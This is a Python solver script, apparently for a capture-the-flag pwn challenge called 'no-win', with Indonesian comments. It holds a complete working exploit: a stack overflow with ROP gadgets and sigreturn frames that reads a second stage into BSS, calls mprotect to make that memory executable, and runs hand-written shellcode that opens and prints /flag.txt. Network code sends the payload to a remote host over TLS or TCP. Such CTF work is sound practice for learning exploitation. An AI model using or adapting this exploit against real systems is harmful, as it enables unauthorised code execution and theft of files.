#!/usr/bin/env python3
import argparse
import re
import socket
import ssl
import struct
import subprocess
import sys
from typing import Tuple

p64 = lambda x: struct.pack("<Q", x & 0xffffffffffffffff)

# ./no-win: amd64 static, NX, no PIE, no canary
OFFSET = 72

POP_RAX_RET = 0x427eeb
SYSCALL_RET = 0x410f46

BSS = 0x4ABC00
MPROTECT_PAGE = 0x4AB000
SHELLCODE_ADDR = BSS + 0x1000

# open("/flag.txt", 0, 0)
# read(fd, rsp - 0x100, 0x100)
# write(1, buf, n)
# exit(0)
#
# Penting:
# - Tidak assume fd == 3
# - fd hasil open langsung dipakai buat read
SHELLCODE = bytes.fromhex(
    "31c0"                    # xor eax,eax
    "50"                      # push rax
    "48b8666c61672e747874"    # mov rax, "flag.txt"
    "50"                      # push rax
    "4883ec01"                # sub rsp,1
    "c604242f"                # mov byte ptr [rsp], '/'
    "4889e7"                  # mov rdi,rsp
    "31f6"                    # xor esi,esi
    "31d2"                    # xor edx,edx
    "b802000000"              # mov eax,2 ; SYS_open
    "0f05"                    # syscall

    "4889c7"                  # mov rdi,rax ; fd
    "4881ec00010000"          # sub rsp,0x100
    "4889e6"                  # mov rsi,rsp
    "ba00010000"              # mov edx,0x100
    "31c0"                    # xor eax,eax ; SYS_read
    "0f05"                    # syscall

    "bf01000000"              # mov edi,1
    "89c2"                    # mov edx,eax
    "b801000000"              # mov eax,1 ; SYS_write
    "0f05"                    # syscall

    "31ff"                    # xor edi,edi
    "b83c000000"              # mov eax,60 ; SYS_exit
    "0f05"                    # syscall
)


def sigreturn_frame(**kw) -> bytes:
    """
    Minimal amd64 rt_sigreturn frame untuk binary static ini.
    Layout ini cukup untuk set rax/rdi/rsi/rdx/rsp/rip.
    """
    regs = {
        k: 0
        for k in (
            "r8 r9 r10 r11 r12 r13 r14 r15 "
            "rdi rsi rbp rbx rdx rax rcx rsp rip"
        ).split()
    }
    regs.update(kw)

    eflags = regs.pop("eflags", 0x202)

    vals = [
        0, 0, 0, 0, 0,
        regs["r8"],
        regs["r9"],
        regs["r10"],
        regs["r11"],
        regs["r12"],
        regs["r13"],
        regs["r14"],
        regs["r15"],
        regs["rdi"],
        regs["rsi"],
        regs["rbp"],
        regs["rbx"],
        regs["rdx"],
        regs["rax"],
        regs["rcx"],
        regs["rsp"],
        regs["rip"],
        eflags,
        0x33,
        0, 0, 0, 0, 0, 0,
    ]

    return b"".join(p64(v) for v in vals).ljust(248, b"\x00")


def build_payload() -> bytes:
    """
    One-shot exploit:

    1. Overflow RIP.
    2. rt_sigreturn -> read(0, BSS, 0x3000), rsp = BSS.
    3. Sisa payload berisi stage2 di BSS.
    4. stage2 rt_sigreturn -> mprotect(BSS page, 0x3000, RWX).
    5. Return ke shellcode.
    6. Shellcode baca /flag.txt.
    """

    # Stage 1 harus pas masuk read pertama yang max 512 bytes.
    stage1 = (
        b"A" * OFFSET
        + p64(POP_RAX_RET)
        + p64(15)              # SYS_rt_sigreturn
        + p64(SYSCALL_RET)
        + sigreturn_frame(
            rax=0,              # SYS_read
            rdi=0,              # stdin
            rsi=BSS,
            rdx=0x3000,
            rsp=BSS,
            rip=SYSCALL_RET,
        )
    ).ljust(512, b"P")

    # Stage 2 akan berada di BSS dan dieksekusi setelah read stage1.
    stage2_core = (
        p64(POP_RAX_RET)
        + p64(15)              # SYS_rt_sigreturn
        + p64(SYSCALL_RET)
    )

    frame_addr = BSS + len(stage2_core)

    stage2_core += sigreturn_frame(
        rax=10,                 # SYS_mprotect
        rdi=MPROTECT_PAGE,
        rsi=0x3000,
        rdx=7,                  # PROT_READ | PROT_WRITE | PROT_EXEC
        rsp=frame_addr + 248,
        rip=SYSCALL_RET,
    )

    stage2_core += p64(SHELLCODE_ADDR)

    gap = SHELLCODE_ADDR - BSS

    if len(stage2_core) > gap:
        raise RuntimeError("stage2 terlalu besar")

    payload = stage1
    payload += stage2_core.ljust(gap, b"Q")
    payload += SHELLCODE

    return payload


def recv_until_quiet(sock, timeout: float) -> bytes:
    sock.settimeout(timeout)

    out = bytearray()

    while True:
        try:
            chunk = sock.recv(4096)
            if not chunk:
                break
            out += chunk
        except socket.timeout:
            break
        except (ConnectionResetError, OSError):
            break

    return bytes(out)


def connect_remote(host: str, port: int, transport: str, timeout: float):
    raw = socket.create_connection((host, port), timeout=max(5.0, timeout))
    raw.settimeout(timeout)

    if transport == "ssl":
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        return ctx.wrap_socket(raw, server_hostname=host)

    return raw


def run_once(
    host: str,
    port: int,
    transport: str,
    timeout: float,
    debug: bool,
) -> bytes:
    payload = build_payload()

    if debug:
        print(
            f"[debug] transport={transport} "
            f"payload_len={len(payload)} "
            f"stage1=512 "
            f"shellcode_at={hex(SHELLCODE_ADDR)}",
            file=sys.stderr,
        )

    with connect_remote(host, port, transport, timeout) as s:
        banner = recv_until_quiet(s, 0.35)

        if debug:
            print(f"[debug] banner={banner!r}", file=sys.stderr)

        s.sendall(payload)

        return banner + recv_until_quiet(s, timeout)


def run_remote(
    host: str,
    port: int,
    transport: str,
    timeout: float,
    debug: bool,
) -> Tuple[bytes, str]:
    """
    Default auto:
    - coba SSL/TLS dulu
    - fallback plain TCP
    """

    if transport in ("plain", "ssl"):
        return run_once(host, port, transport, timeout, debug), transport

    errors = []

    for tr in ("ssl", "plain"):
        try:
            data = run_once(host, port, tr, timeout, debug)

            # Kalau plain kena HTTP proxy, biasanya muncul ini.
            if data.startswith(b"HTTP/1.") and b"400 Bad Request" in data:
                errors.append((tr, "HTTP 400 / wrong transport"))
                continue

            return data, tr

        except Exception as e:
            errors.append((tr, f"{type(e).__name__}: {e}"))

            if debug:
                print(
                    f"[debug] {tr} failed: {type(e).__name__}: {e}",
                    file=sys.stderr,
                )

    msg = "[!] all transports failed: " + "; ".join(
        f"{tr}={err}" for tr, err in errors
    )

    return msg.encode(), "auto"


def run_local(binary: str, timeout: float) -> bytes:
    payload = build_payload()

    p = subprocess.Popen(
        [binary],
        stdin=subprocess.PIPE,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
    )

    try:
        out, err = p.communicate(payload, timeout=timeout)
    except subprocess.TimeoutExpired:
        p.kill()
        out, err = p.communicate()

    return out + err


def format_output(data: bytes, raw: bool = False) -> str:
    text = data.replace(b"\x00", b"").decode("utf-8", "replace")

    m = re.search(
        r"((?:NNS|NNSCTF|CTF|flag|FLAG|ASIS|COMPFEST18)\{[^}\r\n]+\})",
        text,
    )

    if m:
        return f"<FLAG>{m.group(1)}</FLAG>"

    if data.startswith(b"HTTP/1.") and b"400 Bad Request" in data:
        return (
            text.rstrip()
            + "\n\n[!] Ini HTTP 400 dari ingress/proxy."
            + "\nCoba pakai TLS/SNI:"
            + "\n    python3 solve.py HOST PORT --transport ssl --debug --raw"
            + "\natau cek command resmi challenge apakah harus ncat --ssl."
        )

    if raw:
        return "RAW=" + repr(data)

    if text.strip():
        return text

    return "[!] no output; coba: python3 solve.py HOST PORT --transport ssl --debug --raw"


def main() -> int:
    ap = argparse.ArgumentParser(description="NNS CTF no-win solver")

    ap.add_argument("host", nargs="?")
    ap.add_argument("port", nargs="?", type=int)

    ap.add_argument("--local", action="store_true")
    ap.add_argument("--binary", default="./no-win")
    ap.add_argument("--timeout", type=float, default=3.0)

    ap.add_argument(
        "--transport",
        choices=["auto", "plain", "ssl"],
        default="auto",
        help="remote transport; default auto tries ssl/SNI then plain",
    )

    # alias biar enak
    ap.add_argument("--ssl", dest="transport", action="store_const", const="ssl")
    ap.add_argument("--tls", dest="transport", action="store_const", const="ssl")
    ap.add_argument("--plain", dest="transport", action="store_const", const="plain")

    ap.add_argument("--debug", action="store_true")
    ap.add_argument("--raw", action="store_true")

    args = ap.parse_args()

    if args.local:
        data = run_local(args.binary, args.timeout)
        used = "local"
    else:
        if not args.host or args.port is None:
            ap.error("remote: python3 solve.py HOST PORT")

        data, used = run_remote(
            args.host,
            args.port,
            args.transport,
            args.timeout,
            args.debug,
        )

    if args.debug:
        print(f"[debug] used={used}", file=sys.stderr)

    print(format_output(data, args.raw))
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
